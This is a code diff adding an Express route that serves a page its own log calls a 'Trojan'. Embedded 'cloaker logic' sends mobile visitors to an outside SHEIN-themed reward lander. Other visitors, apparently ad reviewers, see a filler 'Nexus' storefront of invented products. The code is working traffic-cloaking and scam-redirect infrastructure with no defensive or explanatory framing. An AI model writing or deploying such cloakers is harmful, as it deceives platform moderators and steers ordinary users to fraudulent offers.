@@ -1533,6 +1533,134 @@ app.get('/ary/:slug', (req, res, next) => {
             console.log(`Served ARY Trojan (${slug})`);
 });
 
+// SHEIN BH FLUENT
+app.get('/870/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=870`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: #ffffff;
+    }
+    .container {
+        display: grid;
+        grid-template-columns: 1fr 2fr;
+        height: 100vh;
+    }
+    .sidebar {
+        background-color: rgba(0, 0, 0, 0.5);
+        padding: 2rem;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+    }
+    .main-content {
+        padding: 2rem;
+        overflow-y: auto;
+    }
+    h1 {
+        font-size: 2.5rem;
+        margin-bottom: 1rem;
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+    }
+    .shop-info {
+        background-color: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        padding: 1rem;
+        margin-bottom: 2rem;
+    }
+    .feature-list {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1rem;
+    }
+    .feature-item {
+        background-color: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        padding: 1rem;
+        transition: transform 0.3s ease;
+    }
+    .feature-item:hover {
+        transform: translateY(-5px);
+    }
+    footer {
+        margin-top: auto;
+    }
+    a {
+        color: #ffd700;
+        text-decoration: none;
+    }
+    a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <div class="sidebar">
+            <h1>${slug} Nexus</h1>
+            <div class="shop-info">
+                <p>Bridging realities: <strong>${slug}</strong></p>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Nexus</p>
+                <p><a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </div>
+        <div class="main-content">
+            <h2>Traverse the Boundary</h2>
+            <p>Step into the ${slug} Nexus, where the impossible becomes tangible and the extraordinary becomes your new normal.</p>
+            
+            <h3>Nexus Offerings</h3>
+            <div class="feature-list">
+                <div class="feature-item">
+                    <h4>Reality Shifters</h4>
+                    <p>Tools to bend your perception</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Quantum Relics</h4>
+                    <p>Artifacts from parallel universes</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Temporal Echoes</h4>
+                    <p>Glimpses of past and future</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Consciousness Expanders</h4>
+                    <p>Unlock hidden potentials of your mind</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 870 Trojan (${slug})`);
+});
+
 // DUDDV3 CLOAKER
 app.get('/duddv3/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
